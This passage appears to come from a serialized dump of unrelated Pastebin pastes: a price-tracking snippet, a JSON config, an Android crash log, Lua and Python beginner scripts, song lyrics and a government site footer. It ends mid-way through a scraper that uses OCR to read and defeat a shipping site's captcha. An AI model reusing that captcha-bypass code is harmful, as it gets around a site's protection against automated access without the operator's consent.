\xa0 if (checkoutPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 checkoutPrice = checkoutPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 if (cartPrice || checkoutPrice) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 var totalPagePrice = cartPrice ? parseInt(cartPrice) : parseInt(checkoutPrice);\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', totalPagePrice);\n\xa0 \xa0 \xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', 0);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 let PAGE_BODY = document.querySelector('BODY');\n\xa0 \xa0 PAGE_BODY.addEventListener('click', setTotalPrice);\n\xa0 \xa0 PAGE_BODY.addEventListener('touchend', setTotalPrice);\n\xa0 \xa0 if (document.readyState === 'loading') {\n\xa0 \xa0 \xa0 \xa0 document.addEventListener('DOMContentLoaded', setTotalPrice);\n\xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 setTotalPrice();\n\xa0 \xa0 }\n})();\n</script>", date='2022-06-01 10:53:03 +00:00', hash_val='e4ef8d93da57f0136b632fcdfcaa2b2c', url='/HmxfrnRy', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='DavudHaji', title='Json for AutoProfile (Example)', content='{\n\xa0 \xa0 ""id"": 1,\n\xa0 \xa0 ""enable"": true,\n\xa0 \xa0 ""branch_id"": 1,\n\xa0 \xa0 ""unversal_profile_id"": null,\n\xa0 \xa0 ""template_id"": 1,\n\xa0 \xa0 ""service_groups"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 40,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 1\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 60,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 2\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ],\n\xa0 \xa0 ""allowed_profiles"":[\n\xa0 \xa0 \xa0 \xa0 1,\n\xa0 \xa0 \xa0 \xa0 2,\n\xa0 \xa0 \xa0 \xa0 3,\n\xa0 \xa0 \xa0 \xa0 5\n\xa0 \xa0 ],\n\xa0 \xa0 ""queue_profile"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"": 1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""queue_id"": 6\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0""queue_id"":5\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ]\n}', date='2022-06-01 10:38:38 +00:00', hash_val='da7784ff281373d2619ac3c3ad0a8b56', url='/CtwGnkGJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='devil2010', title='Link crash', content='Build version: 1.8.6 \nBuild date: 1981-01-01 01:01:02 \nCurrent date: 2022-06-01 16:48:35 \nDevice: Samsung SM-G570Y \nOS version: Android 8.0.0 (SDK 26) \n\xa0\nStack trace: \xa0\njava.lang.RuntimeException: Unable to start activity ComponentInfo{com.civix.link/com.civix.link.Screen.NotificationClickScreen}: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2957)\n\xa0 \xa0 at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3032)\n\xa0 \xa0 at android.app.ActivityThread.-wrap11(Unknown Source:0)\n\xa0 \xa0 at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1696)\n\xa0 \xa0 at android.os.Handler.dispatchMessage(Handler.java:105)\n\xa0 \xa0 at android.os.Looper.loop(Looper.java:164)\n\xa0 \xa0 at android.app.ActivityThread.main(ActivityThread.java:6942)\n\xa0 \xa0 at java.lang.reflect.Method.invoke(Native Method)\n\xa0 \xa0 at com.android.internal.os.Zygote$MethodAndArgsCaller.run(Zygote.java:327)\n\xa0 \xa0 at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1374)\nCaused by: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1975)\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1913)\n\xa0 \xa0 at android.app.IActivityManager$Stub$Proxy.setRequestedOrientation(IActivityManager.java:6224)\n\xa0 \xa0 at android.app.Activity.setRequestedOrientation(Activity.java:5840)\n\xa0 \xa0 at com.civix.link.Screen.NotificationClickScreen.onCreate(NotificationClickScreen.kt:30)\n\xa0 \xa0 at android.app.Activity.performCreate(Activity.java:7183)\n\xa0 \xa0 at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1221)\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2910)\n\xa0 \xa0 ... 9 more\n\xa0\nUser actions: \n2022-06-01 16:48:34: NotificationClickScreen created', date='2022-06-01 09:49:14 +00:00', hash_val='4bf4318a34bb14a9e37ed82cf1eb8e24', url='/RcUN0MQm', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='gogowgogo', title='Announcement Client Manager', content='local Frame = script.Parent.Frame\nlocal TextLabel = Frame.TextLabel\n\xa0\nwhile true do\nTextLabel.Text = ""Please Subscribe!""\nwait(10)\n\xa0 \xa0 TextLabel.Text = ""Please Like!""\n\xa0 \xa0 wait(10)\n\xa0 \xa0 end', date='2022-06-01 09:33:52 +00:00', hash_val='eebc145dac3fe06661b80d1669b1f2df', url='/Ne4dJZVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Dance When You Cry  Dance When You Cry - Fiji Blue  | HoatHinh.tv | bzDUCUDSyyo2', content="Lời bài hát Dance When You Cry \xa0Dance When You Cry - Fiji Blue \xa0| HoatHinh.tv | bzDUCUDSyyo2 Lyrics up by vnflix.com [Verse 1]\nIt's alright\nThat you've been dancing alone the whole night\nYou get lost in the lows and the highs\nYou don't care if it shows\nSometimes (Sometimes)\nThere's a chance for hellos and goodbyes (Goodbyes)\nWhen there's nobody left It's alright\n'Cause you're fine on your own\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThеre's no point in stopping\nWho cares if they'rе watching you, baby?\n\xa0\n[Post-Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Verse 2]\nIt's alright\nIf you don't answer the door sometimes\nYou leave your tears on the floor when you fly\nNo one knows how high you'll go\nNow that you're alone\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n\xa0\n[Post-Chorus]\n(It's one of those of nights, it's one of those of nights)\n(It's one of those of nights, it's one of those of nights)\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Outro]\n(It's one of those of nights)\n(It's one of those of nights)", date='2022-06-01 09:25:11 +00:00', hash_val='e31208a173b7feed60da85dbf7fb1cfe', url='/QtqFRCg5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='aldinokemal', title='Elearning - Footer', content='<div class=""c-footer-nav row text-sm-center text-md-left"">\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Diskominfo Kabupaten Bantul</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/hal/visi-dan-misi"">Visi dan Misi</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/news"" target=""_blank"">Berita</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/announcements"">Pengumuman</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header""><span>Hubungi Kami</span></h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""mailto:diskominfo@bantulkab.go.id"">Email: diskominfo@bantulkab.go.id</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://wa.me/6289685024091"">Whatsapp: 6289685024091</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""#"">Telepon: 0274367509</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/contact-us"">Selengkapnya</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Lokasi</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li><span style=""font-size: 0.85rem;"">Dinas Komunikasi dan Informatika Kabupaten Bantul Komplek Parasamya, Jl. RW Monginsidi Nomor 1 Bantul</span></li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n</div>', date='2022-06-01 09:08:27 +00:00', hash_val='192f6358341df3d57e55298a5d37d6c3', url='/C4b3ZKSG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 09:01:22 +00:00', hash_val='e522a815c1ef8d8bb15910a6ed3f5b6c', url='/WDAvn4HM', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='fueradeservicio', title='n_tgt muestra dirección pero no el contenido', content='### Importamos las funciones que necesitamos ###\n\xa0\nimport os \xa0# Lo necesitamos para ping\n\xa0\n### Fin de importación funciones\n\xa0\n\xa0\n\xa0\n### Definimos \xa0variables ###\n\xa0\n### Fin definición de variables ###\n\xa0\n\xa0\n\xa0\n\xa0\n### Definimos las funciones\n\xa0\n#Mostramos el cartel\ndef presentacion():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ########## PYDESK ##########\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' ** SCRIPT QUE FACILITA ALGUNAS DE LAS ACCIONES MÁS HABITUALES EN EL SISTEMA ** \')\n\xa0 \xa0 print()\n\xa0\n\xa0\n#Mostramos el menú de eleccion\ndef menu_acciones():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'1) HACER PING AL TERMINAL\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'2) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'3) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'4) SALIR\')\n\xa0 \xa0 print()\n\xa0 \xa0 opcion = input(""ELIGE UNA OPCIÓN: "")\n\xa0 \xa0 print(\'Esta es la opción elegida dentro de la funcion: \', opcion)\n\xa0 \xa0 return opcion\n\xa0\n\xa0\n#Funcion que elige la TGT\ndef n_tgt():\n\xa0 \xa0 tgt = input(\'Por favor, intoduce la TGT: \')\n\xa0 \xa0 print(\'Desde la funcion de n_tgt vemos la \xa0TGT elegida \', tgt)\n\xa0 \xa0 return tgt\n\xa0\n\xa0\n\xa0\n#Funcion que hace ping\ndef haz_ping_a(x):\n\xa0 \xa0 print(\'Estamos haciendo ping a \', x \xa0)\n\xa0 \xa0 return x\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n### CUERPO ###\n\xa0\n#Llamamos a las funciones presentacion y menu_acciones\npresentacion()\nmenu_acciones()\nn_tgt()\nhaz_ping_a(n_tgt)', date='2022-06-01 08:57:18 +00:00', hash_val='39bcca476b285ca43c0d46f4c39865a0', url='/n3KceSd6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Merevoli', title='Untitled', content='# -*- coding: utf-8 -*-\nimport io\nimport string\nfrom contextlib import suppress\n\xa0\nimport cv2\nimport dateutil.parser as dateparser\nfrom pp_scraper.mixins import CookieMixin\nimport numpy as np\nimport pytesseract\nfrom collections import deque\nimport math\nimport urllib3\nfrom PIL import Image, ImageEnhance\nfrom pp_scraper import activity_logger\nfrom pp_scraper.spiders.BaseScraper import BaseScraperItemPipeline\nfrom scrapy.http import Request, FormRequest\n\xa0\nRETSCN_BASE_URL = ""http://www.ets-express.com/admin.php/Home/Yanzhengma/index""\nRETSCN_TRACK_URL = ""http://www.ets-express.com/Home/Index/guiji.html""\n\xa0\nACCEPT_CHARS = string.ascii_letters + string.digits\n\xa0\n\xa0\ndef post_process_captcha(captcha: str) -> str:\n\xa0 \xa0 """"""\n \xa0 \xa0tesseract sometimes produces extra special characters (like ""\'"", ""-"")\n \xa0 \xa0and securimage seems to only generate alphanumeric character\n \xa0 \xa0""""""\n\xa0 \xa0 output = """"\n\xa0 \xa0 for c in captcha:\n\xa0 \xa0 \xa0 \xa0 if c in ACCEPT_CHARS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 output += c\n\xa0 \xa0 return output\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0\ndef denoise_image(image):\n\xa0 \xa0 # 1.1. denoise image using PIL\n\xa0 \xa0 image = denoise_image_pil(image)\n\xa0\n\xa0 \xa0 # 1.2. denoise image manually to remove the small objects (using BFS algorithm)\n\xa0 \xa0 image = remove_small_objects(image)\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\ndef denoise_image_pil(image):\n\xa0 \xa0 image = image.convert(\'L\')\n\xa0\n\xa0 \xa0 image = image.point(lambda p: p > 150 and 255)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0\ndef remove_small_objects(image):\n\xa0 \xa0 width, height = image.size\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image.getpixel(next_pos) != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if len(visited_points) <= 30:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for point in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image.putpixel(point, WHITE_COLOR)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image.getpixel((x, y)) != WHITE_COLOR:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef delate_image(image):\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 black_visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] == WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 elif is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 black_visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1], point[0]] = 100\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(point)\n\xa0\n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # for x in range(width):\n\xa0 \xa0 # \xa0 \xa0 for y in range(height):\n\xa0 \xa0 # \xa0 \xa0 \xa0 \xa0 if image[y, x] == WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 visited_points = bfs((0, 0))\n\xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # break\n\xa0\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \ndef split_image(image):\n\xa0 \xa0 SPLITED_IMAGE_SIZE = (30, 30)\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def point_to_image(points):\n\xa0 \xa0 \xa0 \xa0 min_x = min(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 max_x = max(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 min_y = min(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 max_y = max(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = np.empty((max_y - min_y + 1, max_x - min_x + 1, 1), dtype = ""uint8"")\n\xa0 \xa0 \xa0 \xa0 image.fill(255)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1] - min_y, point[0] - min_x] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 x_space = SPLITED_IMAGE_SIZE[0] - (max_x - min_x + 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = cv2.copyMakeBorder(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 top=SPLITED_IMAGE_SIZE[1] - (max_y - min_y + 1),\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bottom=10,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 left=x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 right=x_space - x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 borderType=cv2.BORDER_CONSTANT,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 value=(255, 255, 255)\n\xa0 \xa0 \xa0 \xa0 ) \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return image\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 